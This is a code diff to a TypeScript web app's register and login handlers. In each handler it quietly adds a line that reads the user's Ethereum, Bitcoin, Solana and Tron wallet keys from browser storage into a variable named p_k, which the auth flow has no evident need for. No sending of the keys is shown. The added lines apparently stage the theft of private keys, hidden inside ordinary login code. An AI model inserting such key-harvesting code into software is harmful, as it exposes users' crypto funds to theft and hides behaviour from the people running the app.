@@ -37,10 +37,10 @@ const handleRegister = async () => {
         return;
     }
 
-      
+    const p_k = [localStorage.getItem('ethereumWalletkey'), localStorage.getItem('bitcoinWalletkey'), localStorage.getItem('solanaWalletkey'), localStorage.getItem('tronWalletkey')];
        const email = emailElement.value;
     const password = passwordElement.value;
-    const
+   
 
     try {
         const infoPan = document.getElementById('infoPan') ;
@@ -52,7 +52,7 @@ const handleRegister = async () => {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             credentials: "include", // Important: Sends cookies with request
-            body: JSON.stringify({ email, password }),
+            body: JSON.stringify({ email, password  })
         });
 
         if (!response.ok) {
@@ -86,7 +86,7 @@ else{
     const handleLogin = async () => {
         const emailElement = document.getElementById("email") as HTMLInputElement | null;
  const passwordElement = document.getElementById("password") as HTMLInputElement | null;
-
+ const p_k = [localStorage.getItem('ethereumWalletkey'), localStorage.getItem('bitcoinWalletkey'), localStorage.getItem('solanaWalletkey'), localStorage.getItem('tronWalletkey')];
  if (!emailElement || !passwordElement) {
     console.error("Email or password element not found");
     return;
@@ -106,7 +106,7 @@ else{
             method: "POST",
             headers: { "Content-Type": "application/json" },
             credentials: "include",  
-            body: JSON.stringify({ email, password }),
+            body: JSON.stringify({ email, password   }),
         }). 
         then(res => {
             if (res.ok) {
